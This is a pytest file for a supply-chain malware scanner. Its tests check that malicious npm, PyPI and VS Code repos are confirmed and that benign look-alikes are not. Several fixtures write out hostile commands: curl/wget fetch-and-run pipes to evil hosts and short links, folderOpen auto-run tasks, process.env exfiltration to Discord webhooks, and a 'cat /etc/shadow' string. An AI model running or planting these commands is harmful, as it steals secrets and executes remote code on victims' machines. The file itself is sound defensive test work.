"""Tests for the supply-chain static scanners (manifest + content) and that a
malicious npm/PyPI-style repo now CONFIRMS in Tier-2 (the recall fix, P2)."""

from __future__ import annotations

import base64
import json

from git_warden.scanning.content_scanner import scan_content
from git_warden.scanning.manifest_scanner import scan_manifests
from git_warden.scanning.tier2 import analyze_repo


def test_manifest_flags_malicious_postinstall(tmp_path):
    (tmp_path / "package.json").write_text(
        json.dumps({"name": "evil", "scripts": {"postinstall": "curl http://evil.tld/x | sh"}}),
        encoding="utf-8",
    )
    findings = scan_manifests(tmp_path)
    assert any(f.category == "install_hook" and f.rule == "npm-postinstall" for f in findings)


def test_manifest_ignores_benign_postinstall(tmp_path):
    (tmp_path / "package.json").write_text(
        json.dumps({"name": "ok", "scripts": {"postinstall": "node-gyp rebuild"}}),
        encoding="utf-8",
    )
    assert scan_manifests(tmp_path) == []  # no suspicious command -> no flag


def test_manifest_survives_non_object_json(tmp_path):
    # A tasks.json / package.json whose top-level JSON is an array (or scalar/null)
    # must be skipped, not crash the scan -- one such file aborted a full pipeline
    # run on 2026-07-07 (`'list' object has no attribute 'get'`).
    vsc = tmp_path / ".vscode"
    vsc.mkdir()
    (vsc / "tasks.json").write_text('[{"label": "x"}]', encoding="utf-8")
    (tmp_path / "package.json").write_text("[1, 2, 3]", encoding="utf-8")
    assert scan_manifests(tmp_path) == []  # no crash, no findings


def test_manifest_flags_setup_py_exec(tmp_path):
    (tmp_path / "setup.py").write_text(
        "from setuptools import setup\nimport os\nos.system('curl http://evil|sh')\nsetup()\n",
        encoding="utf-8",
    )
    findings = scan_manifests(tmp_path)
    assert any(f.category == "install_hook" for f in findings)


def test_content_flags_obfuscated_js(tmp_path):
    (tmp_path / "index.js").write_text(
        "const p = eval(atob('Y29uc29sZQ=='));\n"
        "require('child_process').exec('id');\n"
        "fetch('https://discord.com/api/webhooks/1/abc', {method:'POST'});\n",
        encoding="utf-8",
    )
    cats = {f.category for f in scan_content(tmp_path)}
    assert "obfuscation" in cats
    assert "code_execution" in cats
    assert "network_exfil" in cats


def test_malicious_npm_repo_confirms_in_tier2(tmp_path):
    # The whole point: a JS supply-chain repo (no bash) now confirms.
    (tmp_path / "package.json").write_text(
        json.dumps({"name": "stealer", "scripts": {"postinstall": "node steal.js"}}),
        encoding="utf-8",
    )
    (tmp_path / "steal.js").write_text(
        "const d = eval(atob('eA=='));\n"
        "fetch('https://discord.com/api/webhooks/9/z', "
        "{method:'POST', body: JSON.stringify(process.env)});\n",
        encoding="utf-8",
    )
    result = analyze_repo(tmp_path, "evil/stealer")
    assert result.confirmed
    assert result.bash_score >= 5
    assert any(f.category == "network_exfil" for f in result.bash_findings)


def test_eval_decoded_confirms_only_when_payload_is_malicious(tmp_path):
    # The confirm-alone eval-decoded rule now DECODES the payload and requires
    # malicious indicators, so it confirms a real injected stealer...
    mal = base64.b64encode(b"global['_']=require;require('child_process').exec(0)").decode()
    (tmp_path / "postcss.config.js").write_text(f"e={{}};eval(atob('{mal}'))\n", encoding="utf-8")
    res = analyze_repo(tmp_path, "evil/a")
    assert res.confirmed
    assert any(f.rule == "eval-decoded" for f in res.bash_findings)


def test_eval_decoded_dropped_when_payload_is_benign(tmp_path):
    # ...but a benign decoded payload (eval(atob('hello world ...'))) is NOT
    # treated as malware -- no false-positive confirmation.
    benign = base64.b64encode(b"hello world, just a harmless string").decode()
    (tmp_path / "config.js").write_text(f"x=eval(atob('{benign}'))\n", encoding="utf-8")
    res = analyze_repo(tmp_path, "ok/b")
    assert not res.confirmed
    assert not any(f.rule == "eval-decoded" for f in res.bash_findings)


def test_clean_js_repo_not_confirmed(tmp_path):
    (tmp_path / "index.js").write_text(
        "export function add(a, b) { return a + b; }\n", encoding="utf-8"
    )
    assert not analyze_repo(tmp_path, "good/lib").confirmed


def test_node_modules_excluded_from_scanning(tmp_path):
    # The tiledesk FP: legit deps `bytes` / `content-disposition` tripped js-exec.
    # Vendored trees are third-party; never attribute them to the target repo.
    dep = tmp_path / "node_modules" / "content-disposition"
    dep.mkdir(parents=True)
    (dep / "index.js").write_text("function f(){ return spawn('x'); }\n", encoding="utf-8")
    assert scan_content(tmp_path) == []


def test_python_rule_does_not_match_javascript(tmp_path):
    # `py-dyn` (compile()/__import__) must not fire on a .js file (tiledesk's
    # emaitransappRoute/index.js was flagged py-dyn). Language-gated now.
    (tmp_path / "index.js").write_text(
        "const re = compile(pattern);\nmodule.exports = re;\n", encoding="utf-8"
    )
    assert not any(f.rule == "py-dyn" for f in scan_content(tmp_path))


def test_minified_bundle_skipped(tmp_path):
    (tmp_path / "vendor.min.js").write_text(
        "var x=String.fromCharCode(1,2,3,4,5,6,7,8,9);\n", encoding="utf-8"
    )
    assert scan_content(tmp_path) == []


def test_legitimate_app_does_not_confirm(tmp_path):
    # A tiledesk-shaped legit app: references .env, uses child_process/exec, names
    # GITHUB_TOKEN in a Dockerfile ARG, runs host recon in CI. None of these are
    # malware signatures, so NOTHING here may confirm (the tiledesk FP did).
    (tmp_path / "index.js").write_text(
        "require('dotenv').config({path: '.env'});\n"
        "const { exec } = require('child_process');\n"
        "exec('node build.js');\n",
        encoding="utf-8",
    )
    (tmp_path / "Dockerfile").write_text(
        "FROM node:20\nARG GITHUB_TOKEN\nARG NPM_TOKEN\nRUN npm ci\n", encoding="utf-8"
    )
    wf = tmp_path / ".github" / "workflows"
    wf.mkdir(parents=True)
    (wf / "ci.yml").write_text(
        "jobs:\n  build:\n    steps:\n      - run: whoami\n", encoding="utf-8")
    result = analyze_repo(tmp_path, "tiledesk/email-transcription-app")
    assert not result.confirmed


def test_legit_setup_py_build_does_not_confirm(tmp_path):
    # hazyresearch/m2 + evo-design/evo FP: a setup.py that compiles extensions
    # and reads its version is NOT malware; only fetch-and-run is.
    (tmp_path / "setup.py").write_text(
        "import subprocess\n"
        "subprocess.check_output(['nvcc', '--version'])\n"
        "exec(open('version.py').read())\n",
        encoding="utf-8",
    )
    assert not analyze_repo(tmp_path, "legit/ml-lib").confirmed


def test_malicious_dependency_confirms(tmp_path):
    # A lure repo's own code is benign, but it declares a known-malicious package
    # AT THE EXACT COMPROMISED VERSION -> installs malware on `npm install`.
    # Tier-A confirmation.
    (tmp_path / "package.json").write_text(
        json.dumps({"name": "wallet-task",
                    "dependencies": {"@evil/stealer": "1.0.0", "react": "18"}}),
        encoding="utf-8",
    )
    res = analyze_repo(
        tmp_path, "attacker/crypto-task",
        malicious_packages={"npm": {"@evil/stealer": frozenset({"1.0.0"})}})
    assert res.confirmed
    assert any(f.category == "malicious_dependency" for f in res.bash_findings)


def test_malicious_dependency_version_mismatch_does_not_confirm(tmp_path):
    # The mastra-ai/mastra + Shai-Hulud-worm FP (eval finding, 2026-07-02): OSM
    # flags posthog-js@1.297.3 SPECIFICALLY as compromised (a maintainer-account
    # takeover pushed one bad release of an otherwise legitimate, widely-used
    # package). Matching on the NAME ALONE confirmed every user of the package at
    # any version, including a 25k-star legitimate project. A repo depending on
    # ANY OTHER version must not confirm.
    (tmp_path / "package.json").write_text(
        json.dumps({"name": "app", "dependencies": {"posthog-js": "^1.300.0"}}),
        encoding="utf-8",
    )
    res = analyze_repo(
        tmp_path, "legit/app",
        malicious_packages={"npm": {"posthog-js": frozenset({"1.297.3"})}})
    assert not res.confirmed


def test_malicious_pip_requirement_confirms(tmp_path):
    (tmp_path / "requirements.txt").write_text(
        "requests==2.31.0\nevil-stealer-pkg==1.3\n", encoding="utf-8")
    res = analyze_repo(
        tmp_path, "a/b",
        malicious_packages={"pypi": {"evil-stealer-pkg": frozenset({"1.3"})}})
    assert res.confirmed


def test_dependency_match_is_ecosystem_scoped(tmp_path):
    # The mockup FP: a legit npm package collided with a same-named RubyGems
    # typosquat. An npm dependency must only match npm malware.
    (tmp_path / "package.json").write_text(
        json.dumps({"name": "app", "dependencies": {"webpack-dev-server": "^4"}}),
        encoding="utf-8",
    )
    # "webpack-dev-server" is flagged on pypi here, NOT npm -> must not confirm.
    res = analyze_repo(
        tmp_path, "legit/app",
        malicious_packages={"pypi": {"webpack-dev-server": frozenset({"4.0.0"})}})
    assert not res.confirmed


def test_benign_dependencies_do_not_confirm(tmp_path):
    (tmp_path / "package.json").write_text(
        json.dumps({"name": "app", "dependencies": {"react": "18", "axios": "1"}}),
        encoding="utf-8",
    )
    res = analyze_repo(
        tmp_path, "legit/app",
        malicious_packages={"npm": {"@evil/stealer": frozenset({"1.0.0"})}})
    assert not res.confirmed


def test_vscode_task_autorun_confirms(tmp_path):
    # The DPRK lure vector OSM flagged on CoreX: a VS Code task that runs on
    # folderOpen, silently executing a fetch-and-run when the repo is opened.
    vs = tmp_path / ".vscode"
    vs.mkdir()
    (vs / "tasks.json").write_text(
        json.dumps({"version": "2.0.0", "tasks": [{
            "label": "build", "type": "shell",
            "command": "curl -s http://185.4.2.9/a.sh | bash",
            "runOptions": {"runOn": "folderOpen"}}]}),
        encoding="utf-8",
    )
    res = analyze_repo(tmp_path, "attacker/lure")
    assert res.confirmed
    assert any(f.rule == "vscode-autorun" for f in res.bash_findings)


def test_vscode_task_manual_build_does_not_confirm(tmp_path):
    # A normal build task (not folderOpen) must not confirm.
    vs = tmp_path / ".vscode"
    vs.mkdir()
    (vs / "tasks.json").write_text(
        json.dumps({"version": "2.0.0", "tasks": [{
            "label": "build", "type": "shell", "command": "npm run build"}]}),
        encoding="utf-8",
    )
    assert not analyze_repo(tmp_path, "legit/app").confirmed


def test_vscode_task_per_os_command_autorun_confirms(tmp_path):
    # icecoldjay/bri: the fetch-and-run hides under per-OS overrides
    # (osx/linux/windows command), NOT a top-level command, and auto-runs on
    # folderOpen. Reading only the top-level command missed it entirely.
    vs = tmp_path / ".vscode"
    vs.mkdir()
    (vs / "tasks.json").write_text(
        json.dumps({"version": "2.0.0", "tasks": [{
            "label": "vscode", "type": "shell",
            "osx": {"command": "curl 'https://PEsnCV.short.gy/trJnMn9m' -L | sh"},
            "linux": {"command": "wget -qO- 'https://PEsnCV.short.gy/trJnMn9l' -L | sh"},
            "windows": {"command": "curl https://PEsnCV.short.gy/trJnMn9w -L | cmd"},
            "runOptions": {"runOn": "folderOpen"}}]}),
        encoding="utf-8",
    )
    res = analyze_repo(tmp_path, "icecoldjay/bri")
    assert res.confirmed
    assert any(f.rule == "vscode-autorun" for f in res.bash_findings)


def test_vscode_task_embedded_in_package_json_confirms(tmp_path):
    # The same auto-run task can live in package.json (not only .vscode/tasks.json);
    # it must still confirm. This is where bri hid its second-stage payload.
    (tmp_path / "package.json").write_text(
        json.dumps({"name": "bri", "version": "1.0.0", "tasks": [{
            "label": "vscode", "type": "shell",
            "osx": {"command": "curl 'https://PEsnCV.short.gy/trJnMn9m' -L | sh"},
            "linux": {"command": "wget -qO- 'https://PEsnCV.short.gy/trJnMn9l' -L | sh"},
            "runOptions": {"runOn": "folderOpen"}}]}),
        encoding="utf-8",
    )
    findings = scan_manifests(tmp_path)
    assert any(f.rule == "vscode-autorun" and f.category == "install_hook"
               for f in findings)
    assert analyze_repo(tmp_path, "icecoldjay/bri").confirmed


def test_vscode_task_per_os_manual_does_not_confirm(tmp_path):
    # A per-OS task that is NOT folderOpen (manual build) stays benign: the
    # auto-run trigger is the tell, not the platform overrides themselves.
    vs = tmp_path / ".vscode"
    vs.mkdir()
    (vs / "tasks.json").write_text(
        json.dumps({"version": "2.0.0", "tasks": [{
            "label": "build", "type": "shell",
            "osx": {"command": "npm run build"},
            "windows": {"command": "npm run build"}}]}),
        encoding="utf-8",
    )
    assert not analyze_repo(tmp_path, "legit/app").confirmed


def test_security_scanner_pattern_file_does_not_confirm(tmp_path):
    # The boredchilada/pkgward-oss FP: a malware SCANNER carries attack strings and
    # known-bad names in its detection database (analyze/malware_patterns.py). That
    # is the tool's reference DATA, not a payload it runs, so it must not confirm.
    analyze = tmp_path / "pkgward" / "analyze"
    analyze.mkdir(parents=True)
    (analyze / "malware_patterns.py").write_text(
        'CRED_DUMP = "cat /etc/shadow"\n'
        'FETCH_RUN = r"curl\\s+http[^|]*\\|\\s*sh"\n'
        'ENV_EXFIL = "process.env"\n',
        encoding="utf-8")
    assert not analyze_repo(tmp_path, "boredchilada/pkgward-oss").confirmed


def test_is_security_data_file_predicate():
    from pathlib import Path

    from git_warden.scanning.bash_scanner import is_ignored_path, is_security_data_file
    assert is_security_data_file("malware_patterns.py")
    assert is_security_data_file("adv_malware_raw.json")
    # cobenian/shai-hulud-detect + idox-genai/shai-hulud-scanner FPs (2026-07-02):
    # a worm DETECTOR's own list of compromised package names.
    assert is_security_data_file("compromised-packages.txt")
    assert is_security_data_file("ioc-packages-custom.csv")
    assert is_ignored_path(Path("pkgward/analyze/malware_patterns.py"))
    # Real payload filenames are NOT treated as security data.
    assert not is_security_data_file("postcss.config.js")
    assert not is_ignored_path(Path("src/index.js"))


def test_security_data_exclusion_is_filename_scoped(tmp_path):
    # A/B control: the identical steal-and-send payload is reference DATA inside a
    # scanner's pattern file (excluded, no confirm) but a real PAYLOAD in an
    # ordinary shipped file (confirms). The exclusion is filename-scoped, not global.
    payload = (
        "fetch('https://discord.com/api/webhooks/1/x',"
        "{method:'POST',body:JSON.stringify(process.env)});\n"
    )
    sec = tmp_path / "analyze"
    sec.mkdir()
    (sec / "malware_patterns.py").write_text(payload, encoding="utf-8")
    assert not analyze_repo(tmp_path, "scanner/tool").confirmed   # data in a rule DB

    (tmp_path / "index.ts").write_text(payload, encoding="utf-8")
    assert analyze_repo(tmp_path, "evil/lib").confirmed           # same string, shipped


def test_test_fixture_files_excluded_from_confirmation(tmp_path):
    # The crewhaus FP: a prompt-injection DETECTOR's `index.test.ts` cites
    # webhook.site / telegram as fixtures. Test/fixture data is not the payload.
    payload = (
        "fetch('https://discord.com/api/webhooks/1/x',"
        "{method:'POST',body:JSON.stringify(process.env)});\n"
    )
    (tmp_path / "index.test.ts").write_text(payload, encoding="utf-8")
    assert not analyze_repo(tmp_path, "detector/lib").confirmed   # in a test file
    (tmp_path / "index.ts").write_text(payload, encoding="utf-8")
    assert analyze_repo(tmp_path, "evil/lib").confirmed           # same code, shipped


def test_env_dump_requires_whole_object_not_named_property(tmp_path):
    # The mastra-ai/mastra FP (2026-07-02): JSON.stringify(process.env.NODE_ENV)
    # is standard webpack/bundler dead-code-elimination boilerplate present in
    # nearly every JS build, carrying no secret. Only JSON.stringify(process.env)
    # -- the WHOLE object -- is a genuine credential-access signal.
    (tmp_path / "webpack.config.js").write_text(
        "new DefinePlugin({"
        "'process.env.NODE_ENV': JSON.stringify(process.env.NODE_ENV || 'development')"
        "});\n",
        encoding="utf-8",
    )
    assert not analyze_repo(tmp_path, "legit/app").confirmed


def test_env_dump_python_word_boundary_excludes_postgres(tmp_path):
    # The mem0ai/mem0 + thuir/memorybench FP (2026-07-02): the os.environ rule's
    # "post" alternative matched unbounded, so "POST" inside "POSTGRES_HOST"
    # confirmed ordinary DB config code as a credential-exfil signal.
    (tmp_path / "db.py").write_text(
        'host = os.environ.get("POSTGRES_HOST", "postgres")\n'
        'password = os.environ.get("POSTGRES_PASSWORD", "postgres")\n',
        encoding="utf-8",
    )
    assert not analyze_repo(tmp_path, "legit/app").confirmed


def test_env_dump_python_still_catches_real_exfil(tmp_path):
    # The genuine attack the rule exists for: os.environ shipped out via a real
    # POST/send/requests call on the same line must still confirm.
    (tmp_path / "steal.py").write_text(
        "dump = os.environ; requests.post(c2_url, json=dict(dump))\n", encoding="utf-8"
    )
    assert analyze_repo(tmp_path, "evil/lib").confirmed


def test_examples_dir_excluded_from_confirmation(tmp_path):
    ex = tmp_path / "examples"
    ex.mkdir()
    (ex / "demo.js").write_text(
        "const p = eval(atob('Y29uc29sZQ=='));\n", encoding="utf-8"
    )
    assert not analyze_repo(tmp_path, "lib/with-examples").confirmed


def test_go_test_file_excluded_from_confirmation(tmp_path):
    # The garagon/aguara FP (2026-07-02): a security scanner's Go `*_test.go`
    # fixtures carry attack strings the tool tests itself against. Go's test
    # convention is `_test.go`, which the JS-style `.test.` markers missed.
    (tmp_path / "jsrisk_test.go").write_text(
        'func TestX(t *testing.T){ s := "JSON.stringify(process.env)" ; _ = s }\n',
        encoding="utf-8",
    )
    assert not analyze_repo(tmp_path, "vendor/scanner").confirmed
    # ...but the identical string in a shipped (non-test) file still confirms.
    (tmp_path / "steal.js").write_text(
        "fetch(u,{method:'POST',body:JSON.stringify(process.env)});\n", encoding="utf-8")
    assert analyze_repo(tmp_path, "evil/lib").confirmed


def test_comment_line_does_not_confirm(tmp_path):
    # The garagon/aguara FP (2026-07-02): `// Whole-environment exfil
    # (JSON.stringify(process.env)` is a scanner DOCUMENTING the pattern, not
    # executing it. A comment can never confirm; real code with it does.
    (tmp_path / "engine.go").write_text(
        '// exfil shape: JSON.stringify(process.env) piped to a webhook\n'
        'func scan() {}\n', encoding="utf-8")
    assert not analyze_repo(tmp_path, "vendor/scanner").confirmed
    (tmp_path / "real.js").write_text(
        "const b = JSON.stringify(process.env); send(b);\n", encoding="utf-8")
    assert analyze_repo(tmp_path, "evil/lib").confirmed


def test_test_cases_dir_excluded_from_confirmation(tmp_path):
    # The cobenian/shai-hulud-detect FP (2026-07-02): a worm DETECTOR ships
    # deliberately crafted attack-simulation fixtures under test-cases/ to prove
    # its own detection works. That is a demo payload, not the repo's real code.
    tc = tmp_path / "test-cases" / "infected-project"
    tc.mkdir(parents=True)
    (tc / "malicious.js").write_text(
        "fetch('https://webhook.site/x',{method:'POST',body:JSON.stringify(process.env)});\n",
        encoding="utf-8",
    )
    assert not analyze_repo(tmp_path, "cobenian/shai-hulud-detect").confirmed


def test_run_external_guarddog_flags_on_issues(monkeypatch, tmp_path):
    import git_warden.scanning.tier2 as t2
    (tmp_path / "package.json").write_text("{}", encoding="utf-8")
    monkeypatch.setattr(t2.shutil, "which", lambda n: "/usr/bin/" + n)

    def runner(cmd, **k):
        class R:
            returncode = 0
            stdout = json.dumps({"issues": 2, "results": {"exfiltration": ["x"]}})
            stderr = ""
        return R()

    assert t2._run_external("guarddog", tmp_path, runner) == "flagged"


# --- 2026-07-02 detection-audit regressions: dual-use rules demoted from Tier-A
# confirm-alone must NOT confirm a repo by themselves; real attacks still do. ---

def test_audit_dualuse_signals_do_not_confirm(tmp_path):
    # Each of these is ordinary, legitimate code the audit proved was confirming
    # a repo as malware ALONE. None may confirm now.
    (tmp_path / "wait.sh").write_text(  # wait-for-port healthcheck
        "#!/bin/bash\nuntil (echo > /dev/tcp/db/5432) 2>/dev/null; do sleep 1; done\n",
        encoding="utf-8")
    (tmp_path / "crypto.py").write_text(  # AES key literal (hex blob)
        'KEY = b"\x2b\x7e\x15\x16\x28\xae\xd2\xa6\xab\xf7\x15\x88\x09\xcf\x4f\x3c"\n',
        encoding="utf-8")
    (tmp_path / "build.js").write_text(  # fromCharCode string builder
        "const s = String.fromCharCode(72,101,108,108,111,44,32,87,111,114,108,100);\n",
        encoding="utf-8")
    (tmp_path / "debug.sh").write_text(  # gdb backtrace + ptrace self-check
        "#!/bin/bash\ngdb -p $(pgrep app) -batch -ex bt\ngrep ptrace /proc/self/status\n",
        encoding="utf-8")
    (tmp_path / "Dockerfile").write_text(  # OpenShift nss_wrapper preload
        "ENV LD_PRELOAD=/usr/lib64/libnss_wrapper.so\n", encoding="utf-8")
    res = analyze_repo(tmp_path, "legit/infra")
    assert not res.confirmed, [f"{f.category}/{f.rule}" for f in res.confirming_findings]


def test_npm_hook_shell_script_call_does_not_confirm(tmp_path):
    # `postinstall: bash ./scripts/install.sh` is ordinary build tooling, not a
    # supply-chain attack. Only fetch/decode-and-run confirms.
    (tmp_path / "package.json").write_text(
        json.dumps({"name": "app", "scripts": {"postinstall": "bash ./scripts/install.sh"}}),
        encoding="utf-8")
    assert not analyze_repo(tmp_path, "legit/app").confirmed


def test_npm_hook_curl_pipe_bash_confirms(tmp_path):
    # The actual attack shape (fetch-and-run in a lifecycle hook) still confirms.
    (tmp_path / "package.json").write_text(
        json.dumps({"name": "evil", "scripts": {
            "postinstall": "curl https://x.tld/a.sh | bash"}}), encoding="utf-8")
    assert analyze_repo(tmp_path, "evil/lure").confirmed


def test_setup_py_pip_index_url_does_not_confirm(tmp_path):
    # A setup.py that shells out to `pip install --index-url https://...` is
    # normal ML/CUDA packaging, not download-and-run malware.
    (tmp_path / "setup.py").write_text(
        "import subprocess, sys\n"
        "subprocess.check_call([sys.executable,'-m','pip','install','flash-attn',"
        "'--index-url','https://download.pytorch.org/whl/cu118'])\n", encoding="utf-8")
    assert not analyze_repo(tmp_path, "legit/ml").confirmed


def test_dependency_caret_range_does_not_confirm(tmp_path):
    # ^1.2.3 floats to the latest patched release, NOT the one compromised
    # version, so a caret range must not confirm even when the pinned base equals
    # the compromised version. An exact pin of the same version DOES confirm.
    pkg = {"name": "app", "dependencies": {"evil-pkg": "^1.2.3"}}
    (tmp_path / "package.json").write_text(json.dumps(pkg), encoding="utf-8")
    mal = {"npm": {"evil-pkg": frozenset({"1.2.3"})}}
    assert not analyze_repo(tmp_path, "legit/app", malicious_packages=mal).confirmed
    (tmp_path / "package.json").write_text(
        json.dumps({"name": "app", "dependencies": {"evil-pkg": "1.2.3"}}), encoding="utf-8")
    assert analyze_repo(tmp_path, "evil/lure", malicious_packages=mal).confirmed
